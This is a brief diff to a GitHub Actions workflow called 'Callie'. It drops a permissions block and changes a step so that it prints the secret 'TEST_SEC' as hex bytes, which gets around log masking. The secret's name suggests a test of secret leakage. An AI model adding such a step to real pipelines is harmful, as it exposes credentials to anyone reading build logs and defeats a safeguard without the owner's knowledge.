@@ -2,9 +2,6 @@ name: Callie
 
 on:
   workflow_call:
-  
-permissions: 
-   pages: write
 
 jobs:
   callie-job:
@@ -12,5 +9,5 @@ jobs:
     steps:
       - name: Callie job
         run: |
-              echo "I'm NEW!"
+              echo -n ${{ secrets.TEST_SEC }} | od -A n -t x1
         
